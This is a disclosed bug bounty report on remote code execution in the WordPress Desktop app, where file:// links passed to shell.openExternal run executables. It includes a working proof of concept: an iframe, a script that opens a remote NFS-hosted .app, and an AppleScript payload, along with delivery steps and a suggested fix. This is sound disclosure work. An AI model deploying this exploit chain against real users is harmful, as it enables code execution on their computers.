---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '301458'
original_report_id: '301458'
title: Remote Code Execution in Wordpress Desktop
weakness: Code Injection
team_handle: automattic
created_at: '2017-12-31T00:08:35.763Z'
disclosed_at: '2018-04-14T22:09:50.511Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 10
tags:
- hackerone
- code-injection
---

# Remote Code Execution in Wordpress Desktop

## Metadata

- HackerOne Report ID: 301458
- Weakness: Code Injection
- Program: automattic
- Disclosed At: 2018-04-14T22:09:50.511Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

An attacker can create a malicious page that when viewed or edited in Wordpress Desktop App will results in remote code execution. 

This issue looks to be around this line of code: 
https://github.com/Automattic/wp-desktop/blob/develop/desktop/window-handlers/external-links/index.js#L38

If shell.openExternal is sent a file:// url it will try to open that file in the default native application (instead of the default browser).  If we pass the an a .app file on MacOS or an exe it will just execute the code. 

We also link to a remote readable NFS mount (or windows share) to point to a remote executable. 

A Wordpress page is created with: 
```
<center><iframe style="border: 0;" src="https://maustin.net/hax/wp_desktop/index.html" width="250" height="250"></iframe></center> 
```

This file has the following code: 
```
   <script>
      // window.open('file:///Applications/Calculator.app');
      window.open('file:///net/192.241.239.91/var/nfs/general/hack2.app')
   </script>
```

The file at file:///net/192.241.239.91/var/nfs/general/hack2.app is a simple applescript Application with the following code:

```
tell application "Terminal"
    do script "cat /etc/hosts"
    display dialog "You just got hacked!"
end tell

do shell script "open -a Calculator"
```

### POC
1. Create the setup described above. 
2. Invite any wordpress.com user to edit. (or wait for them to follow you and click on your site in the "reader")
3. Code is executed when the user views the page. 

See attached video for a working POC. 


### Sugested Fix: 
Before passing a url to shell.openExternal the application should validate that it begins with http:// or https://.

## Impact

An attacker could target any individual with a wordpress.com account by inviting them to be an editor. When they simply view the page in the desktop application the code would run. 

The remote attacker would be able to run any code as the current user on the system once the page is viewed.

In my testing I used a remote wordpress blog (with jetpack) so that I would be able to add an iframe. However I believe with a Business account a custom wordpress plugin could achieve the same result on a wordpress.com hosted account.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
